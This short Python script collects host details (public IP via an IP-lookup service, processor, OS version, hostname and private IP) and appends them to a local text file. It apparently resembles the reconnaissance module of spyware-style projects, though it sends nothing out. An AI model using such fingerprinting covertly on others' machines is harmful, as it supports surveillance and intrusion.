import platform
import os
import socket
from requests import get
from dotenv import load_dotenv
load_dotenv()  

file_path = os.getenv("FILE_PATH")
extend = "\\"

#get computer information
system_information = "system_info.txt"

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip + '\n')
        except Exception:
            f.write("Couldnt get the Public IP Address (Most Likely max query)\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hotname: " + hostname + "\n")
        f.write("Private IP: " + IPAddr + '\n')
